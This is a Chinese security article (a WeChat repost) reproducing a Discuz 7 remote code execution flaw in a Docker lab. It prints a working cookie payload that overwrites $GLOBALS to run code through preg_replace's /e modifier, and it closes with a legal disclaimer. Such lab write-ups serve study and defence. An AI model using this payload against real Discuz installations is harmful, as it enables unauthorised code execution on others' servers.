> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/52WR8NL7aQfKVYyjWKVyuw)

**漏洞简介**

由于 php5.3.x 版本里 php.ini 的设置里`request_order`默认值为 GP，导致`$_REQUEST`中不再包含`$_COOKIE`，我们通过在 Cookie 中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。

**原理分析**

```
https://www.secpulse.com/archives/2338.html

```

**环境搭建**

执行以下命令启动 Discuz 7：

```
docker-compose up -d


```

启动后，访问 http://your-ip:8080/install 来安装 discuz

如下为安装步骤：  

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDwemib3ZFVXAd5iaHPUwGRGt647NLBfY4h5pnFSfEdQ7dm9vW0nJJoicr6cQ/640?wx_fmt=png)直接下一步：

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDwejeA0iaJhUSZ5WJASS4sIMBMoHGicBBcIXH9lvaNSbdXnAYYAg9X4IakA/640?wx_fmt=png)

数据库地址填写 db，数据库名为 discuz，数据库账号密码均为 root。  

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDweUQzaXCBacZ2gF0eoMRHSGZOvTTqicKLqttaFb1FkVXylcz02DiaJYD5Q/640?wx_fmt=png)

进入界面：  

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDwex1LicjPtIweSZiaz5xAOBoeY4KibNr7RTrDlFdJQTkmpREgib7iazIcgibew/640?wx_fmt=png)  

**漏洞复现**

安装成功后，随便在里面找一个已存在的帖子

```
http://192.168.137.145:8080/viewthread.php?tid=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDwezBbs3nwm1UYTUqZPTicMEscLsSGrf4Ku7FzuM1PZfqpZoNgzpLMIl3g/640?wx_fmt=png)

向其发送数据包，并在 Cookie 中增加

```
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDweaf3sZM0uZibT2DAia4Ig4jpwrABbwg5STqFPuicwkyXbEpTbQmvhvPeqw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVzWIMDtB50nqxppzqH9lDweb1TOGe7eOiabicRrWk6vlk6vEeshfcp92OTwg0ekhWDYCrTcII8844ug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVyrxia20wsaCgWRpnw8luMUzzuAianziaumQGCHZYP4ysakGIUVQ7PQwEXUbiaF6DXZkJJJZM1DqmiaokA/640?wx_fmt=jpeg)

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**